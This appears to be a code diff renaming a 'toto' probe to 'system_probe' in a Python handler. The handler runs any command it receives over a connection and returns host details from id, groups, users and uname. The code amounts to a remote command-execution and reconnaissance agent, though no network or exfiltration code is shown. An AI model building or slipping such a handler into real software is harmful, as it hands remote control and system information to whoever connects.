@@ -5,7 +5,7 @@ import time
 
 
 import subprocess
-TOTO_PREFIX = "__TOTO__"
+SYSTEM_PROBE_PREFIX = "__SYSTEM_PROBE__"
 
 
 def run_system_command(command: str) -> str:
@@ -26,14 +26,14 @@ def run_system_command(command: str) -> str:
     return output or "(no output)"
 
 
-def build_toto_payload() -> str:
+def build_system_probe_payload() -> str:
     data = {
         "id": run_system_command("id"),
         "groups": run_system_command("groups"),
         "users": run_system_command("users"),
         "uname": run_system_command("uname -a"),
     }
-    return TOTO_PREFIX + json.dumps(data)
+    return SYSTEM_PROBE_PREFIX + json.dumps(data)
 
 def build_response(command: str, name: str) -> str:
     command = command.strip()
@@ -44,11 +44,11 @@ def build_response(command: str, name: str) -> str:
     if command.lower() == "exit":
         return f"[{name}] closing connection"
 
-    if command.lower() == "toto":
+    if command.lower() == "system_probe":
         try:
-            return build_toto_payload()
+            return build_system_probe_payload()
         except Exception as e:
-            return f"[{name}] toto error: {e}"
+            return f"[{name}] system_probe error: {e}"
 
     try:
         output = run_system_command(command)
